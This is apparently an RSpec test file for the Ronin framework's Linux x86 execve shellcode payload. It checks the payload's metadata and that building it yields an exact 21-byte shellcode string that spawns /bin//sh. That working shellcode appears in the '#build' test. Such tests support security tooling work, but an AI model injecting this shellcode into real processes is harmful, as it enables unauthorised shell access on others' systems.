require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/linux/x86/execve'

describe Ronin::Payloads::Shellcode::Linux::X86::Execve do
  it "must inherit from Ronin::Payloads::ShellcodePayload" do
    expect(described_class).to be < Ronin::Payloads::ShellcodePayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/linux/x86/execve'" do
      expect(subject.id).to eq('shellcode/linux/x86/execve')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86" do
      expect(subject.arch).to be(:x86)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :linux" do
      expect(subject.os).to be(:linux)
    end
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
